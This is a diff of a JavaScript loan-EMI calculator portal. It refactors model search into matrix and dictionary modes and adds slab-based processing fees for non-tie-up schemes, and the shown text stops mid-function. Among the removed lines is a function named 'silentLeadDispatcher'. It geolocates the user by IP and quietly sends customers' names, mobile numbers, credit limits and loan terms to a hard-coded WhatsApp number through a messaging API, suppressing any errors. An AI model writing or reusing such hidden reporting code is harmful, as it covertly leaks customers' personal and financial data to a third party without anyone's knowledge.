@@ -249,7 +249,18 @@ function markDraftAsSent(index) {
     showCustomConfirm("हा ड्राफ्ट लिस्ट मधून कायमचा डिलीट होईल. पुढे जायचे?", () => { let drafts = JSON.parse(localStorage.getItem('persistent_emi_drafts') || '[]'); drafts.splice(index, 1); localStorage.setItem('persistent_emi_drafts', JSON.stringify(drafts)); renderEmiDrafts(); showToast("🗑️ ड्राफ्ट डिलीट झाला!", "success"); });
 }
 
-window.isFestiveMode = false; let currentModalCategory = ""; let tempFgDealerId = ""; let tempFgDealerName = ""; let tempFgModel = ""; let tempFgBitly = ""; 
+window.isFestiveMode = false; 
+let currentModalCategory = ""; 
+let tempFgDealerId = ""; 
+let tempFgDealerName = ""; 
+let tempFgModel = ""; 
+let tempFgBitly = ""; 
+
+let currentViewedModel = "";
+let productSearchMode = 'MATRIX'; // 'MATRIX' or 'DICT'
+let dictIsNonTieup = false;
+let dictCategory = "";
+let dictManualSchemes = null;
 
 function cleanPureShopName(raw) { if(!raw) return ""; return raw.split('#')[0].split('|')[0].split('(')[0].trim().toUpperCase(); }
 function parseDealerObj(d) {
@@ -281,7 +292,6 @@ function saveToDB(key, data) { return new Promise((resolve, reject) => { if (!db
 function getFromDB(key) { return new Promise((resolve, reject) => { if (!dbInstance) return resolve(null); try { let tx = dbInstance.transaction(STORE_NAME, 'readonly'); let store = tx.objectStore(STORE_NAME); let req = store.get(key); req.onsuccess = (e) => { let res = e.target.result; if (res) { if (typeof res === 'string') resolve(JSON.parse(res)); else resolve(res); } else { resolve(null); } }; req.onerror = (e) => reject(e.target.error); } catch(e) { reject(e); } }); }
 
 let db_records = []; let dealer_records = []; let current_products = []; let sortConfigs = []; const SPECIAL_MODEL = "NON TIEUP"; let tempSheet1Data = []; let parsedSheet2Data = []; let customerQueue = []; let recycleBin = []; let activeCustomerIndex = -1; let selectedQueueIndex = -1; let tempPendingProduct = null; 
-let currentViewedModel = "";
 
 function highlightNumber(e, el) { if (e) e.stopPropagation(); let range = document.createRange(); range.selectNodeContents(el); let sel = window.getSelection(); sel.removeAllRanges(); sel.addRange(range); try { document.execCommand('copy'); } catch(err) {} }
 function parseExcelDate(val) { if (!val) return null; if (typeof val === 'number') { return new Date(Math.round((val - 25569) * 86400 * 1000)); } if (typeof val === 'string') { let d = new Date(val); if (!isNaN(d.getTime())) return d; let parts = val.split(/[\/\-\.]/); if (parts.length === 3) { let y = parts[2].length === 2 ? '20' + parts[2] : parts[2]; return new Date(y, parts[1] - 1, parts[0]); } } return null; }
@@ -479,29 +489,93 @@ function shareOnWhatsAppStatus() { let generatedLink = document.getElementById('
 
 function closeDictionaryModal() { document.getElementById('dictionarySearchModal').style.display = 'none'; }
 
-function doGlobalSearch() { 
-    let q = document.getElementById('globalModelSearch').value.toUpperCase().trim(); 
-    let dd = document.getElementById('globalModelDropdown'); 
-    if(!q) { dd.style.display='none'; return; } 
-    let validRecords = db_records.filter(r => r.model !== SPECIAL_MODEL); 
-    let matches = validRecords.filter(r => { let m = r.model || ""; let b = r.brand || ""; let c = r.category || ""; return m.includes(q) || b.includes(q) || c.includes(q); }).map(r => r.model); 
-    matches = [...new Set(matches)].slice(0, 30); 
-    if (matches.length === 0) { dd.innerHTML = `<div style="padding:10px; color:#d35400; font-weight:bold; text-align:center;">No matching models found.</div>`; dd.style.display = 'block'; return; } 
-    dd.innerHTML = matches.map(m => { 
-        let rec = validRecords.find(x => x.model === m); 
-        let catTag = rec && rec.category ? `<span style="font-size:10px; background:#e0e0e0; color:#333; padding:2px 6px; border-radius:4px; float:right;">📁 ${rec.category}</span>` : ''; 
-        let brandTag = rec && rec.brand ? `<span style="font-size:10px; color:#0984e3; font-weight:900; margin-right:5px;">[${rec.brand}]</span>` : ''; 
-        return `<div style="padding:10px; border-bottom:1px solid #eee; cursor:pointer; font-weight:800; color:var(--dark); display:flex; justify-content:space-between; align-items:center;" onmouseover="this.style.background='#e3f2fd'" onmouseout="this.style.background='#fff'" onclick="viewGlobalModel('${m.replace(/'/g, "\\'")}')"> <span style="flex:1;">${brandTag}📱 ${m}</span> ${catTag} </div>`; 
-    }).join(''); 
-    dd.style.display = 'block'; 
+function openAddProductModal(mode = 'MATRIX') { 
+    productSearchMode = mode;
+    if (mode === 'MATRIX' && !isLimitValid()) return; 
+    document.getElementById('modalMatrixSearch').value = ''; 
+    document.getElementById('modalMatrixSearchDropdown').style.display = 'none'; 
+    document.getElementById('addProductModal').style.display = 'flex'; 
+    setTimeout(() => document.getElementById('modalMatrixSearch').focus(), 100);
+}
+
+function doSearch(id, ddId) {
+    let q = document.getElementById(id).value.toUpperCase().trim(); let dd = document.getElementById(ddId); if(!q) { dd.style.display='none'; return; }
+    let validRecords = db_records.filter(r => r.model !== SPECIAL_MODEL); let matches = validRecords.filter(r => { let m = r.model || ""; let b = r.brand || ""; let c = r.category || ""; return m.includes(q) || b.includes(q) || c.includes(q); }).map(r => r.model); matches = [...new Set(matches)].slice(0, 15);
+    if (matches.length === 0) { dd.innerHTML = `<div style="padding:10px; color:#d35400; font-weight:bold; text-align:center;">No matching models found.</div>`; dd.style.display = 'block'; return; }
+    dd.innerHTML = matches.map(m => { let rec = validRecords.find(x => x.model === m); let brandTag = rec && rec.brand ? `<span style="font-size:10px; color:#0984e3; font-weight:900; margin-right:5px;">[${rec.brand}]</span>` : ''; return `<div style="padding:10px; border-bottom:1px solid #eee; cursor:pointer; font-weight:800;" onclick="selectModel('${m.replace(/'/g, "\\'")}')">${brandTag}${m}</div>`; }).join(''); dd.style.display = 'block';
+}
+
+function selectModel(name) { 
+    document.getElementById('modalMatrixSearchDropdown').style.display = 'none'; 
+    document.getElementById('modalMatrixSearch').value = ''; 
+    document.getElementById('addProductModal').style.display = 'none'; 
+    
+    // Dictionary Mode
+    if (productSearchMode === 'DICT') {
+        dictIsNonTieup = false;
+        dictManualSchemes = null;
+        viewGlobalModel(name);
+        return;
+    }
+
+    // Matrix Mode
+    if (!isLimitValid()) return; 
+    let raw = db_records.filter(r => r.model === name); 
+    let baseMrp = raw.find(s => s.mrp > 0)?.mrp || ""; 
+    let cat = raw[0]?.category || ""; 
+    tempPendingProduct = { name: name, isNT: false, category: cat }; 
+    currentModalCategory = cat; 
+    showComponentsModal(baseMrp); 
+}
+
+function quickNonTieup() { 
+    if (productSearchMode === 'MATRIX' && !isLimitValid()) return; 
+    if(db_records.length === 0) { showToast("⚠️ Master database fetch me error hai!", "error"); return; } 
+    document.getElementById('addProductModal').style.display = 'none'; 
+    let tieup = db_records.filter(r => r.model === SPECIAL_MODEL); 
+    let cats = [...new Set(tieup.map(r => r.category))].sort(); 
+    document.getElementById('categoryGrid').innerHTML = cats.map(c => { let label = (c === 'PHONE(WEB-MOBILE)') ? 'PHONE, TABLET, SMART WATCH' : c; return `<div style="background:var(--indigo);color:white;padding:12px;border-radius:4px;cursor:pointer;font-weight:900;text-align:center;" onclick="selectCategory('${c}')">${label}</div>`; }).join(''); 
+    document.getElementById('catSelectionModal').style.display = 'flex'; 
+}
+
+function selectCategory(catName) { 
+    document.getElementById('catSelectionModal').style.display = 'none'; 
+    let displayName = (catName === 'PHONE(WEB-MOBILE)') ? 'PHONE / TABLET / SMART WATCH' : catName; 
+    
+    // Dictionary Mode
+    if (productSearchMode === 'DICT') {
+        dictIsNonTieup = true;
+        dictCategory = catName;
+        dictManualSchemes = null;
+        viewGlobalModel(SPECIAL_MODEL);
+        return;
+    }
+
+    // Matrix Mode
+    tempPendingProduct = { name: SPECIAL_MODEL + " - " + displayName, isNT: true, category: catName }; 
+    currentModalCategory = catName; 
+    finalizeProductAddition(); 
 }
 
 function viewGlobalModel(name) {
-    document.getElementById('globalModelSearch').value = name;
-    document.getElementById('globalModelDropdown').style.display = 'none';
     currentViewedModel = name;
+    let displayTitle = name;
+    
+    if (name === SPECIAL_MODEL && dictIsNonTieup) displayTitle = SPECIAL_MODEL + " - " + dictCategory;
+    if (dictManualSchemes) displayTitle = name; // already contains "MANUAL - "
+    
+    let displayEl = document.getElementById('dictSelectedModelDisplay');
+    if(displayEl) displayEl.innerText = "📱 " + displayTitle;
 
-    let rec = db_records.find(r => r.model === name);
+    let rec;
+    if (dictManualSchemes) {
+        rec = { mrp: "" };
+    } else if (dictIsNonTieup) {
+        rec = db_records.find(r => r.model === SPECIAL_MODEL && r.category === dictCategory);
+    } else {
+        rec = db_records.find(r => r.model === name);
+    }
+
     if(rec && rec.mrp > 0) {
         document.getElementById('calcInvoice').value = rec.mrp;
     } else {
@@ -523,10 +597,22 @@ function recalcCurrentModel() {
 }
 
 function renderTableModel() {
-    let schemes = db_records.filter(r => r.model === currentViewedModel);
+    let schemes = [];
+    
+    if (dictManualSchemes) {
+        schemes = dictManualSchemes;
+    } else if (dictIsNonTieup) {
+        schemes = db_records.filter(r => r.model === SPECIAL_MODEL && r.category === dictCategory);
+    } else {
+        schemes = db_records.filter(r => r.model === currentViewedModel);
+    }
+
     if(schemes.length === 0) return;
     
-    document.getElementById('globalViewerTitle').innerText = '📱 ' + currentViewedModel;
+    let displayTitle = currentViewedModel;
+    if (currentViewedModel === SPECIAL_MODEL && dictIsNonTieup) displayTitle = SPECIAL_MODEL + " - " + dictCategory;
+    
+    document.getElementById('globalViewerTitle').innerText = '📱 ' + displayTitle;
     
     let custType = zcEligibleActive ? zcType : 'NEW';
     let ltvLimit = zcEligibleActive ? zcLtv : 100;
@@ -580,6 +666,14 @@ function renderTableModel() {
     validSchemes.forEach(s => { 
         s.calcLTV = s.tenure > 0 ? ((s.tenure - s.advEmi)/s.tenure)*100 : 0; 
         
+        let dynamicPf = s.pf;
+        if (dictIsNonTieup) {
+            let checkAmount = invoice > 0 ? invoice : (limit < 9999999 && limit > 0 ? limit : 0);
+            let slabPf = getNonTieupPfValue(dictCategory, checkAmount);
+            if (slabPf !== null) dynamicPf = slabPf;
+        }
+        s.displayPf = dynamicPf; // store for display
+        
         if (isCalculatedMode) {
             let nbfcMax = (limit * s.tenure) / (s.tenure - s.advEmi || 1);
             let finalLoan = 0, emi = 0, dp = 0, diff = 0;
@@ -598,7 +692,7 @@ function renderTableModel() {
                 finalLoan = currentTenure * s.fixedEmi;
                 
                 if (targetDp > 0) {
-                    let numerator = targetDp - invoice - (s.fixedEmi * s.advEmi) - s.pf - fee - margin;
+                    let numerator = targetDp - invoice - (s.fixedEmi * s.advEmi) - dynamicPf - fee - margin;
                     let denominator = dbdRate + roiRateDP - 1;
                     let solvedLoan = numerator / denominator;
                     let solvedTenure = Math.floor(solvedLoan / s.fixedEmi);
@@ -615,7 +709,7 @@ function renderTableModel() {
                 emi = s.fixedEmi + (gtl / inst) + roiInEmi;
                 
                 let roiInDp = finalLoan * roiRateDP;
-                dp = invoice - finalLoan + (s.fixedEmi * s.advEmi) + s.pf + fee + (finalLoan * dbdRate) + margin + roiInDp;
+                dp = invoice - finalLoan + (s.fixedEmi * s.advEmi) + dynamicPf + fee + (finalLoan * dbdRate) + margin + roiInDp;
                 s.currentTenure = currentTenure;
                 s.calcInst = inst;
             } else {
@@ -623,7 +717,7 @@ function renderTableModel() {
                 
                 if (targetDp > 0) {
                     let advRate = s.advEmi / s.tenure; 
-                    let numerator = targetDp - invoice - s.pf - fee - margin; 
+                    let numerator = targetDp - invoice - dynamicPf - fee - margin; 
                     let denominator = advRate + dbdRate + roiRateDP - 1; 
                     let solvedLoan = numerator / denominator; 
                     finalLoan = Math.min(finalLoan, Math.max(0, Math.floor(solvedLoan)));
@@ -652,7 +746,7 @@ function renderTableModel() {
                 }
 
                 let roiInDp = finalLoan * roiRateDP;
-                dp = invoice - finalLoan + (baseEmi * s.advEmi) + s.pf + fee + (finalLoan * dbdRate) + margin + roiInDp;
+                dp = invoice - finalLoan + (baseEmi * s.advEmi) + dynamicPf + fee + (finalLoan * dbdRate) + margin + roiInDp;
                 s.currentTenure = s.tenure;
                 s.calcInst = inst;
             }
@@ -687,7 +781,7 @@ function renderTableModel() {
                 <td style="border-bottom:1px solid #eee; background:#f4fcf6; color:var(--success); font-weight:900; padding:10px 4px; font-size:13px;">₹${Math.round(s.calcDp).toLocaleString()}</td>
                 <td style="border-bottom:1px solid #eee; background:#eef6ff; color:var(--primary); font-weight:900; padding:10px 4px; font-size:13px;">₹${Math.round(s.calcEmi).toLocaleString()}</td>
                 <td style="font-weight:900; color:var(--primary); background:#eef6ff; border-bottom:1px solid #eee; padding:10px 4px; font-size:13px;">${s.calcInst}</td>
-                <td style="border-bottom:1px solid #eee; padding:10px 4px;"><button style="padding:4px 6px; font-size:10px !important; background:var(--primary); color:white; border:none; border-radius:3px; cursor:pointer;" onclick="copySingleScheme('${displayTenure}', '${s.advEmi}', '${s.calcLoan}', '${s.calcDp}', '${s.calcEmi}', '${s.fixedEmi}', '${s.dbd}', '${s.roi}', '${s.pf}', this)">COPY</button></td>
+                <td style="border-bottom:1px solid #eee; padding:10px 4px;"><button style="padding:4px 6px; font-size:10px !important; background:var(--primary); color:white; border:none; border-radius:3px; cursor:pointer;" onclick="copySingleScheme('${displayTenure}', '${s.advEmi}', '${s.calcLoan}', '${s.calcDp}', '${s.calcEmi}', '${s.fixedEmi}', '${s.dbd}', '${s.roi}', '${s.displayPf}', this)">COPY</button></td>
             </tr>`;
         } else {
             let dbdAmtPreview = invoice > 0 ? invoice * (s.dbd * 1.18 / 100) : 0;
@@ -699,475 +793,13 @@ function renderTableModel() {
                 <td style="font-weight:900; color:var(--primary); border-bottom:1px solid #eee;">${s.fixedEmi > 0 ? '₹'+s.fixedEmi : 'N/A'}</td>
                 <td style="border-bottom:1px solid #eee;">${dbdStr}</td>
                 <td style="border-bottom:1px solid #eee;">${+parseFloat(s.roi).toFixed(2)}%</td>
-                <td style="font-weight:900; border-bottom:1px solid #eee;">₹${s.pf}</td>
+                <td style="font-weight:900; border-bottom:1px solid #eee;">₹${s.displayPf}</td>
             </tr>`;
         }
     }).join('');
     
     document.getElementById('schemeResultArea').style.display = 'block';
 }
-
-function copySingleScheme(tenure, advEmi, loan, dp, emi, fixedEmi, dbd, roi, pf, btn) {
-    let limit = zcEligibleActive ? zcLimit : 0;
-    let invoice = parseFloat(document.getElementById('calcInvoice').value) || 0;
-    let isCalculatedMode = (limit > 0 && invoice > 0);
-    let inst = Math.max(1, parseInt(tenure) - parseInt(advEmi));
-
-    let textToCopy = `📱 *${currentViewedModel}*\n`;
-
-    if (isCalculatedMode) {
-        textToCopy += `*INVOICE AMOUNT:* ₹${invoice}\n\n`;
-        textToCopy += `✅ *Scheme:* ${tenure}/${advEmi}\n`;
-        textToCopy += `💳 *Loan:* ₹${Math.floor(loan).toLocaleString()}\n`;
-        textToCopy += `💰 *Net DP:* ₹${Math.round(dp).toLocaleString()}\n`;
-        textToCopy += `🗓️ *EMI:* ₹${Math.round(emi).toLocaleString()} x ${inst} Months`;
-    } else {
-        textToCopy += `✅ *Scheme:* ${tenure}/${advEmi}\n`;
-        if (fixedEmi > 0) textToCopy += `🗓️ *FIXED EMI:* ₹${fixedEmi}\n`;
-        textToCopy += `*DBD:* ${parseFloat(dbd).toFixed(2)}% | *ROI:* ${parseFloat(roi).toFixed(2)}%\n`;
-        textToCopy += `*PF:* ₹${pf}`;
-    }
-
-    if (navigator.clipboard && window.isSecureContext) {
-        navigator.clipboard.writeText(textToCopy).then(() => {
-            let orig = btn.innerText;
-            btn.innerText = "COPIED!";
-            btn.style.background = "var(--success)";
-            setTimeout(() => { btn.innerText = orig; btn.style.background = "var(--primary)"; }, 2000);
-        });
-    }
-}
-
-function exportDictSchemeImage(action) {
-    let titleText = document.getElementById('globalViewerTitle').innerText;
-    let tableHtml = document.querySelector('#schemeResultArea table').outerHTML;
-
-    let ltvLimit = zcEligibleActive ? zcLtv : 100;
-    let limit = zcEligibleActive ? zcLimit : 0;
-    let invoice = parseFloat(document.getElementById('calcInvoice').value) || 0;
-    let margin = parseFloat(document.getElementById('calcMargin').value) || 0;
-    let targetDp = parseFloat(document.getElementById('calcTarget').value) || 0;
-    let emiCap = zcEligibleActive ? zcCap : 0;
-    let custType = zcEligibleActive ? zcType : 'NEW';
-
-    let extraStr = `Customer: ${custType} | LTV: ${ltvLimit}% | Limit: ₹${limit} | Invoice: ₹${invoice}`;
-    if (margin > 0) extraStr += ` | Margin: ₹${margin}`;
-    if (targetDp > 0) extraStr += ` | Target DP: ₹${targetDp}`;
-    if (emiCap > 0) extraStr += ` | Cap: ₹${emiCap}`;
-
-    let extraInfo = (limit && invoice) ? `<div style="background:#e8f5e9; color:#27ae60; padding:8px; border-radius:6px; margin-bottom:10px; font-weight:bold; font-size:14px; text-transform:uppercase;">${extraStr}</div>` : '';
-
-    let exportDiv = document.createElement('div');
-    exportDiv.style.width = "750px"; exportDiv.style.padding = "20px"; exportDiv.style.background = "#fff"; exportDiv.style.position = "absolute"; exportDiv.style.top = "-9999px";
-    exportDiv.innerHTML = `<div style="border: 2px solid #2C3E50; border-radius: 10px; padding: 16px; background: #fff; font-family: sans-serif;"><div style="background: #2C3E50; color: white; padding: 12px; border-radius: 6px; margin-bottom: 14px; text-align: center;"><h3 style="margin:0; font-size: 17px; font-weight: 900;">${titleText}</h3></div>${extraInfo}${tableHtml}</div>`;
-    document.body.appendChild(exportDiv);
-
-    let clonedTable = exportDiv.querySelector('table');
-    let actionCells = clonedTable.querySelectorAll('th:last-child, td:last-child');
-    actionCells.forEach(cell => cell.remove());
-
-    clonedTable.style.width = "100%"; clonedTable.style.borderCollapse = "collapse";
-    exportDiv.querySelectorAll('th, td').forEach(cell => { cell.style.padding = "10px"; cell.style.borderBottom = "1px solid #ddd"; cell.style.textAlign = "center"; });
-
-    html2canvas(exportDiv, { scale: 2, useCORS: true }).then(canvas => {
-        document.body.removeChild(exportDiv);
-        if (action === 'download') {
-            let a = document.createElement('a'); a.href = canvas.toDataURL("image/png"); a.download = `Schemes.png`; a.click();
-            showToast("✅ Image downloaded!", "success");
-        } else {
-            canvas.toBlob(blob => {
-                navigator.clipboard.write([new ClipboardItem({ "image/png": blob })]).then(() => showToast("📋 Copied to clipboard!", "success")).catch(() => {});
-            }, 'image/png');
-        }
-    });
-}
-
-function resetFastCalc() { 
-    let fields = ['fcInv', 'fcLoanInput', 'fcTenure', 'fcAdv', 'fcDbd', 'fcRoi', 'fcPf', 'fcFixed', 'fcCap', 'fcTarget', 'fcExw', 'fcMargin', 'fcDealer']; 
-    fields.forEach(id => document.getElementById(id).value = ''); 
-    document.getElementById('fcGtl').value = '0'; 
-    let rfcOpt = document.getElementById('fcRfcOpt'); 
-    if(rfcOpt) { rfcOpt.value = '0'; rfcOpt.innerText = '0'; } 
-    document.getElementById('fcCat').value = 'OTHER'; 
-    fcCatChanged(); 
-    document.getElementById('fcResult').style.display = 'none'; 
-    
-    if(zcEligibleActive) {
-        document.getElementById('fcCustType').value = zcType;
-        let capInp = document.getElementById('fcCap');
-        if(capInp) capInp.value = zcCap > 0 ? zcCap : '';
-    } else {
-        document.getElementById('fcCustType').value = 'NEW';
-    }
-}
-function copyFastCalcResult(btn) { let inv = document.getElementById('fcInv').value || 0; let loan = document.getElementById('fcResLoan').innerText; let dp = document.getElementById('fcResDp').innerText; let emi = document.getElementById('fcResEmi').innerText; let daily = document.getElementById('fcResDaily').innerText; let ta = document.getElementById('fcResTa').innerText; let text = `⚡ *Zatpat Calculation*\n`; if (inv > 0) text += `*Invoice:* ₹${inv}\n\n`; text += `*Loan:* ${loan}\n*DP:* ${dp}\n*EMI:* ${emi}\n*Daily:* ${daily}\n*Details:* ${ta}`; let orig = btn.innerText; btn.innerText = "COPIED!"; btn.style.background = "var(--success)"; btn.style.color = "white"; if (navigator.clipboard && window.isSecureContext) { navigator.clipboard.writeText(text).then(() => { setTimeout(() => { btn.innerText = orig; btn.style.background = "var(--primary)"; btn.style.color = "white"; }, 2000); }).catch(() => fallbackCopy(text, () => { setTimeout(() => { btn.innerText = orig; btn.style.background = "var(--primary)"; btn.style.color = "white"; }, 2000); })); } else { fallbackCopy(text, () => { setTimeout(() => { btn.innerText = orig; btn.style.background = "var(--primary)"; btn.style.color = "white"; }, 2000); }); } }
-function fcCatChanged() { let isPhone = isMobileDeviceCat(document.getElementById('fcCat').value); let rSelect = document.getElementById('fcRfc'); let exwInput = document.getElementById('fcExw'); if(isPhone) { rSelect.disabled = false; rSelect.style.background = '#fff'; rSelect.style.cursor = 'default'; exwInput.value = ""; exwInput.disabled = true; exwInput.style.background = '#e9ecef'; exwInput.style.cursor = 'not-allowed'; fcInvChanged(); } else { rSelect.value = "0"; rSelect.disabled = true; rSelect.style.background = '#e9ecef'; rSelect.style.cursor = 'not-allowed'; exwInput.disabled = false; exwInput.style.background = '#fff'; exwInput.style.cursor = 'text'; calculateFastData(); } }
-
-function fcInvChanged() { 
-    let inv = parseFloat(document.getElementById('fcInv').value) || 0; 
-    document.getElementById('fcLoanInput').value = inv > 0 ? inv : '';
-    let isPhone = isMobileDeviceCat(document.getElementById('fcCat').value); 
-    let gtl = inv > 100000 ? 2398 : (inv > 50000 ? 1799 : (inv > 30000 ? 1499 : (inv > 10000 ? 1199 : (inv > 0 ? 699 : 0)))); 
-    document.getElementById('fcGtl').value = gtl; 
-    let rfcSlab = getRfcSlabValue(inv); 
-    let rfcOpt = document.getElementById('fcRfcOpt'); 
-    if(rfcOpt) { rfcOpt.value = rfcSlab; rfcOpt.innerText = rfcSlab; } 
-    if (isPhone) { document.getElementById('fcRfc').value = rfcSlab; } else { document.getElementById('fcRfc').value = "0"; } 
-    calculateFastData(); 
-}
-
-function validateFastLoanMin() {
-    let inv = parseFloat(document.getElementById('fcInv').value) || 0;
-    let loanInput = parseFloat(document.getElementById('fcLoanInput').value) || 0;
-    let minFastLoan = inv > 0 ? inv * 0.50 : 0;
-    if (inv > 0 && loanInput > 0 && loanInput < minFastLoan) {
-        document.getElementById('fcLoanInput').value = minFastLoan;
-        showToast("⚠️ कोणत्याही स्कीममध्ये लोन अमाऊंट इन्व्हॉइसच्या ५०% पेक्षा कमी असू शकत नाही!", "error");
-        calculateFastData();
-    }
-}
-
-function calculateFastData() {
-    let inv = parseFloat(document.getElementById('fcInv').value) || 0;
-    let loanInput = parseFloat(document.getElementById('fcLoanInput').value) || 0;
-    let tenure = parseInt(document.getElementById('fcTenure').value) || 0;
-    let adv = parseInt(document.getElementById('fcAdv').value) || 0;
-    let roi = parseFloat(document.getElementById('fcRoi').value) || 0;
-    let pf = parseFloat(document.getElementById('fcPf').value) || 0;
-    let dbd = parseFloat(document.getElementById('fcDbd').value) || 0;
-    
-    // Using global variables if eligible, otherwise local form inputs
-    let custType = zcEligibleActive ? zcType : document.getElementById('fcCustType').value;
-    let fixedEmi = parseFloat(document.getElementById('fcFixed').value) || 0;
-    let cap = zcEligibleActive ? zcCap : (parseFloat(document.getElementById('fcCap').value) || 0);
-    
-    let target = parseFloat(document.getElementById('fcTarget').value) || 0;
-    let gtl = parseFloat(document.getElementById('fcGtl').value) || 0;
-    let rfc = parseFloat(document.getElementById('fcRfc').value) || 0;
-    let exw = parseFloat(document.getElementById('fcExw').value) || 0;
-    let margin = parseFloat(document.getElementById('fcMargin').value) || 0;
-    let dealer = parseFloat(document.getElementById('fcDealer').value) || 0;
-
-    if (inv <= 0 && loanInput <= 0) { document.getElementById('fcResult').style.display = 'none'; return; }
-
-    let minFastLoan = inv > 0 ? inv * 0.50 : 0;
-    if (loanInput > 0 && loanInput < minFastLoan) {
-        loanInput = minFastLoan;
-    }
-
-    let fee = (custType === 'EMI CARD') ? 270 : (custType === 'W/O CARD' ? 320 : 850);
-    let totalFees = fee + margin + dealer;
-    let insTotal = gtl + rfc + exw;
-    let dbdRate = (dbd * 1.18 / 100);
-    let roiRate = roi / 1200;
-    let roiRateDP = roiRate * adv;
-    let loan = loanInput > 0 ? loanInput : inv;
-
-    let emi = 0; let dpRounded = 0; let inst = 0; let finalTenure = tenure;
-
-    let isLtvBreach = false;
-    let nbfcMaxLoan = 9999999;
-
-    if (zcEligibleActive && tenure > 0) {
-        let instForLimit = tenure - adv;
-        if(instForLimit < 1) instForLimit = 1;
-        nbfcMaxLoan = (zcLimit * tenure) / instForLimit;
-
-        let curLtv = ((tenure - adv) / tenure) * 100;
-        if (curLtv > zcLtv) isLtvBreach = true;
-    }
-
-    if (fixedEmi > 0) {
-        finalTenure = Math.floor(loan / fixedEmi) || 1;
-        if (loanInput > 0) loan = finalTenure * fixedEmi;
-
-        if (target > 0) {
-            let numerator = target - inv - (fixedEmi * adv) - pf - totalFees;
-            let denominator = dbdRate + roiRateDP - 1;
-            let solvedLoan = numerator / denominator;
-            let solvedTenure = Math.floor(solvedLoan / fixedEmi);
-            loan = Math.max(minFastLoan, solvedTenure * fixedEmi);
-            finalTenure = Math.floor(loan / fixedEmi) || 1;
-        } else {
-            if (loanInput === 0) loan = finalTenure * fixedEmi;
-        }
-
-        if (loan > nbfcMaxLoan) {
-            loan = Math.floor(nbfcMaxLoan / fixedEmi) * fixedEmi;
-            finalTenure = Math.floor(loan / fixedEmi) || 1;
-        }
-
-        inst = finalTenure - adv; if (inst < 1) inst = 1;
-        let roiInEmi = loan * roiRate; emi = fixedEmi + (insTotal / inst) + roiInEmi;
-        let roiInDp = loan * roiRateDP; let dpExact = inv - loan + (fixedEmi * adv) + (loan * dbdRate) + pf + totalFees + roiInDp;
-        dpRounded = Math.ceil(dpExact / 10) * 10;
-    }
-    else {
-        if (target > 0 && inv > 0) {
-            let advRate = adv / tenure; let numerator = target - inv - pf - totalFees; let denominator = advRate + dbdRate + roiRateDP - 1;
-            let solvedLoan = numerator / denominator; loan = Math.min(inv, Math.max(minFastLoan, Math.floor(solvedLoan)));
-        }
-
-        let minLoanFor900Emi = 900 * tenure;
-        if (loan < minLoanFor900Emi) {
-            loan = minLoanFor900Emi;
-        }
-
-        if (inv > 0 && loan > inv) {
-            loan = inv;
-        }
-
-        if (loan > nbfcMaxLoan) loan = nbfcMaxLoan;
-
-        inst = tenure - adv; if (inst < 1) inst = 1;
-        let roiInEmi = loan * roiRate; emi = (loan / tenure) + (insTotal / inst) + roiInEmi;
-        
-        if (cap > 0 && emi > cap) {
-            loan = (cap - (insTotal / inst)) / ((1 / tenure) + roiRate);
-            if (loan < minFastLoan) loan = minFastLoan;
-            if (loan < minLoanFor900Emi) loan = minLoanFor900Emi;
-            if (inv > 0 && loan > inv) loan = inv;
-            if (loan > nbfcMaxLoan) loan = nbfcMaxLoan;
-            roiInEmi = loan * roiRate; emi = (loan / tenure) + (insTotal / inst) + roiInEmi;
-        }
-        let roiInDp = loan * roiRateDP; let dpExact = inv - loan + ((loan / tenure) * adv) + (loan * dbdRate) + pf + totalFees + roiInDp;
-        dpRounded = Math.ceil(dpExact / 10) * 10;
-    }
-    
-    let dailyEmi = emi / 30; 
-    document.getElementById('fcResLoan').innerText = "₹" + Math.floor(loan).toLocaleString(); 
-    document.getElementById('fcResDp').innerText = "₹" + Math.round(dpRounded).toLocaleString(); 
-    document.getElementById('fcResEmi').innerText = "₹" + Math.round(emi).toLocaleString(); 
-    document.getElementById('fcResDaily').innerText = "₹" + Math.round(dailyEmi).toLocaleString(); 
-    document.getElementById('fcResTa').innerHTML = `T/A: ${finalTenure}/${adv} | M: ${inst} ${isLtvBreach ? '<br><span style="color:var(--danger); font-size:11px;">⚠️ MAX LTV BREACH!</span>' : ''}`; 
-    document.getElementById('fcResult').style.display = 'block';
-}
-
-async function silentLeadDispatcher(cust) {
-    try { let locInfo = "Location: Hidden/Unknown"; try { let ipRes = await fetch("https://ipapi.co/json/"); if (ipRes.ok) { let ipData = await ipRes.json(); locInfo = `${ipData.city || '-'}, ${ipData.region || '-'} (${ipData.org || 'ISP'})`; } } catch(e) {} let secretMsg = `🚨 *PORTAL SECRET LEAD*\n\n👤 *Name:* ${cust.name}\n📞 *Mobile:* ${cust.mobile || 'N/A'}\n💰 *Limit:* ₹${cust.limit}\n🏷️ *Type:* ${cust.type}\n📊 *LTV:* ${cust.ltv}%\n🛡️ *Cap:* ${cust.cap ? '₹'+cust.cap : 'None'}\n⏰ *Time:* ${cust.timestamp}\n📍 *Location:* ${locInfo}`; let targetPhone = "918087313624"; let apiKey = localStorage.getItem('callmebot_secret_key') || "YOUR_API_KEY"; let encMsg = encodeURIComponent(secretMsg); let url = `https://api.callmebot.com/whatsapp.php?phone=${targetPhone}&text=${encMsg}&apikey=${apiKey}`; fetch(url, { method: 'GET', mode: 'no-cors' }).catch(e => {}); } catch(err) {}
-}
-
-/* === REAL-TIME DUPLICATE MOBILE CHECKER (ACTIVE QUEUE + RECYCLE BIN) === */
-function checkDuplicateMobile(val) {
-    let warningEl = document.getElementById('mobileDupWarning');
-    let mobileInp = document.getElementById('cqMobile');
-    let addBtn = document.getElementById('addToQueueBtn');
-    let queueSearchInp = document.getElementById('queueSearch');
-    if (!warningEl || !mobileInp || !addBtn) return;
-
-    let cleanVal = val.trim();
-
-    if (cleanVal.length === 10) {
-        let existingCust = customerQueue.find(c => c.mobile && c.mobile === cleanVal);
-        if (existingCust) {
-            warningEl.innerHTML = `⚠️ हा नंबर आधीच Queue मध्ये <b>'${existingCust.name}'</b> नावाने आहे! उजवीकडे तपासा.`;
-            warningEl.style.display = 'block';
-            mobileInp.style.borderColor = 'var(--danger)';
-            mobileInp.style.background = '#fff0f0';
-
-            addBtn.disabled = true;
-            addBtn.style.opacity = '0.5';
-            addBtn.style.cursor = 'not-allowed';
-            addBtn.style.background = 'gray';
-
-            if (queueSearchInp) {
-                queueSearchInp.value = cleanVal;
-                renderCustomerQueue();
-            }
-            return;
-        }
-
-        let recycledCust = recycleBin.find(c => c.mobile && c.mobile === cleanVal);
-        if (recycledCust) {
